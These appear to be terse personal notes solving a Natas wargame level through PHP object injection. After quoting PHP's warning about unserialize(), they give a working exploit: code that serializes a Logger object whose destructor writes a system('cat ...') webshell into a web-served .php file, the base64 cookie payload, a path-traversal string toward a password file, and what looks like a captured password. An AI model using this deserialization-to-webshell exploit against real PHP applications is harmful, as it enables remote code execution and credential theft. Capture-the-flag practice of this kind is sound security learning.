Warning

Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.

If you need to unserialize externally-stored serialized data, consider using hash_hmac() for data validation. Make sure data is not modified by anyone but you.

$drawing=unserialize(base64_decode($_COOKIE["drawing"]));

https://redbotsecurity.com/php-insecure-deserialization/
https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
https://ctftime.org/writeup/12781

lets do path traversal + php object injection

$imgfile="img/natas26_" . session_id() .".png";
/var/www/natas/natas24/index.php
/var/www/natas/natas24/img/natas26_abcde

/var/www/natas/natas24/
../../../../etc/natas_webpass/natas27

YTo1OntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjUwIjtzOjI6InkxIjtzOjM6IjEwMCI7czoyOiJ4MiI7czoyOiI1MCI7czoyOiJ5MiI7czozOiIxMDAiO31pOjE7YTo0OntzOjI6IngxIjtzOjI6IjUwIjtzOjI6InkxIjtzOjM6IjEwMCI7czoyOiJ4MiI7czozOiIxMDAiO3M6MjoieTIiO3M6MzoiMTAwIjt9aToyO2E6NDp7czoyOiJ4MSI7czozOiIyMDAiO3M6MjoieTEiO3M6MzoiMjY1IjtzOjI6IngyIjtzOjM6IjY3NCI7czoyOiJ5MiI7czozOiIyNDMiO31pOjM7YTowOnt9aTo0O2E6NDp7czoyOiJ4MSI7czoyOiI1MCI7czoyOiJ5MSI7czozOiIxMDAiO3M6MjoieDIiO3M6MzoiMTAwIjtzOjI6InkyIjtzOjM6IjEwMCI7fX0%3D


<?php system('cat /etc/natas_webpass/natas26'); return 0; ?>

run this code:

<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="<?php echo system('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "/var/www/natas/natas26/img/teraaa2.php";
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
    
$l = new Logger();
echo base64_encode(serialize($l));
?>

Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozODoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvdGVyYWFhMi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU1OiI8P3BocCBlY2hvIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9

put this in cookies
go to img/teraaa.php

u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYneu3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne
